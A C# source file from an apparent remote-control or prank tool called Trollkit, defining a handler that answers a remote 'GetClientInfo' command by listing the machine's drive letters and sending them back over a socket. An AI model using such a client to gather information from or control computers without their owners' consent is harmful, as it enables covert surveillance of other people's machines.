using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using Trollkit_Library;
using Trollkit_Library.Models;
using Trollkit_Library.Modules;

namespace Trollkit_Client.Modules.CommandHandlers
{
    class SystemInfoHandler : ICommandHandler
    {
        public override bool HandleCommand(Socket s, TransferCommandObject obj)
        {
			switch (obj.Command)
			{
				case "GetClientInfo":
					string drives = getSysInfo();


					TransferCommandObject drivesTransferObject = new TransferCommandObject { Command = "Drives", Handler = "SystemInfo", Value = drives};
					SendDataObjectToSocket(s, ClientServerPipeline.BufferSerialize(drivesTransferObject));
					return true;
			}

			return false;
        }

        private string getSysInfo()
        {
            string returnString = "Available Drives: ";
            var drives = DriveInfo.GetDrives();
            foreach (DriveInfo info in drives)
            {
                if (info.IsReady)
                {
                    returnString += $"({info.Name.Replace("\\", "")}) ";
                }
            }
            return returnString;
        }
    }
}
